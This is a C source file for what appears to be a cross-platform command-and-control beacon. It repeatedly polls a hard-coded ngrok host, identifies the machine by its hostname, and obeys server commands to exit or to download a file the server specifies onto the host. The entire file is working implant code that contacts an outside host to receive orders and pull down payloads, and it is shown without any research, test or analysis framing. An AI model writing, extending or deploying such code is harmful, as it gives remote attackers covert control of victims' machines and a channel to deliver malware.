#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include "downloader/downloader.h"

#ifdef _WIN32
#include <windows.h>
#include <winhttp.h>

#define HOST L"allegedly-great-shiner.ngrok-free.app"
#define PATH L"/"
#define PORT INTERNET_DEFAULT_HTTPS_PORT

#else
#include <sys/utsname.h>
#include <curl/curl.h>

#define URL "https://allegedly-great-shiner.ngrok-free.app"

static inline void Sleep(unsigned int ms){sleep(ms / 1000);}
size_t callback(char *buffer, size_t itemsize, size_t nitems, void *userdata);
#endif


struct memory {
	char *data;
	size_t size;
};

void parse_response(char *command);
char *get_uname(int size_);

int main(){
	struct memory response = {0};

#ifdef _WIN32
	char *user_agent = get_uname(25);
	int len = MultiByteToWideChar(CP_UTF8, 0, user_agent, -1, NULL, 0);
	wchar_t *new_ua = malloc(len * sizeof(wchar_t));
	if (!new_ua || len == 0){
		fprintf(stderr, "unable to get uname\n");
		exit(1);
	}
	MultiByteToWideChar(CP_UTF8, 0, user_agent, -1, new_ua, len);
	HINTERNET hSession = WinHttpOpen(
		new_ua,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0
	);
	free(new_ua);
	if (!hSession) {
		fprintf(stderr, "WinHttpOpen failed\n");
		return 1;
	}
	HINTERNET hConnect = WinHttpConnect(
		hSession,
		HOST,
		PORT,
		0
	);
	if (!hConnect) {
		fprintf(stderr, "WinHttpConnect failed\n");
		return 1;
	}
#else
	CURL *curl;
	CURLcode status_code;
	curl = curl_easy_init();
	if (curl == NULL){
		fprintf(stderr, "curl init failed\n");
		return 1;
	}
	curl_easy_setopt(curl, CURLOPT_USERAGENT, get_uname(25));
	curl_easy_setopt(curl, CURLOPT_URL, URL);
	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, callback);
	curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
#endif

	while (1){
		free(response.data);
		response.data = NULL;
		response.size = 0;
#ifdef _WIN32
		HINTERNET hRequest = WinHttpOpenRequest(
			hConnect,
			L"GET",
			PATH,
			NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE
		);
		if (!hRequest) {
			fprintf(stderr, "WinHttpOpenRequest failed\n");
			Sleep(5000);
			continue;
		}
		if (!WinHttpSendRequest(
			hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0,
			WINHTTP_NO_REQUEST_DATA,
			0,
			0,
			0
		)) {
			WinHttpCloseHandle(hRequest);
			Sleep(5000);
			continue;
		}
		if (!WinHttpReceiveResponse(hRequest, NULL)) {
			WinHttpCloseHandle(hRequest);
			Sleep(5000);
			continue;
		}
		DWORD bytesRead;
		char buffer[1024];
		while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
			char *tmp = realloc(response.data, response.size + bytesRead + 1);
			if (!tmp) break;
			response.data = tmp;
			memcpy(response.data + response.size, buffer, bytesRead);
			response.size += bytesRead;
			response.data[response.size] = '\0';
		}
#else
		status_code = curl_easy_perform(curl);
		if (status_code != CURLE_OK){
			fprintf(stderr, "Error: %s\n", curl_easy_strerror(status_code));
			sleep(10);
			continue;
		}
#endif
		if (response.data){
			parse_response(response.data);
		} else {
			printf("No data recieved\n");
		}
		Sleep(5000);
	}
	free(response.data);
#ifdef _WIN32
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);
#else
	curl_easy_cleanup(curl);
#endif
	return 0;
}

#ifndef _WIN32
size_t callback(char *buffer, size_t itemsize, size_t nitems, void *userdata){
	size_t bytes = itemsize * nitems;
	struct memory *memptr = (struct memory *)userdata;
	char *data_ptr = realloc(memptr->data, memptr->size+bytes+1);
	if (data_ptr == NULL){
		fprintf(stderr, "Error: Failed to allocate memory\n");
		return 0;
	}
	memptr->data = data_ptr;
	memcpy(&(memptr->data[memptr->size]), buffer, bytes);
	memptr->size += bytes;
	memptr->data[memptr->size] = '\0';
	return bytes;
}
#endif

char *get_uname(int size_){
	char *u_name = (char *)malloc(sizeof(char) * size_);
#ifdef _WIN32
	char computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(computerName) / sizeof(computerName[0]);

	if (GetComputerName(computerName, &size)) {
		strncpy(u_name, computerName, size_);
	} else {
		printf("Failed to get system name on Windows.\n");
	}
#else
	struct utsname name;
	if (uname(&name) != -1) {
		strncpy(u_name, name.nodename, size_);
	} else {
		perror("uname failed on Linux/POSIX");
	}
#endif
	return u_name;
}

#define PUSH_PREFIX "<PUSH>@"
#define PUSH_PREFIX_LEN (sizeof(PUSH_PREFIX) - 1)

void parse_response(char *command){
	if (strcmp(command, "<TERMINATE>") == 0){
		exit(0);
	} else if (strncmp(command, PUSH_PREFIX, PUSH_PREFIX_LEN) == 0){
		const char *download_url = command + PUSH_PREFIX_LEN;
		printf("%s\n", download_url);
		if (download_file(download_url, "download.out") == 0){
			printf("Download successful\n");
		} else {
			printf("Download failed\n");
		}
	}else {
		printf("%s\n", command);
	}
}
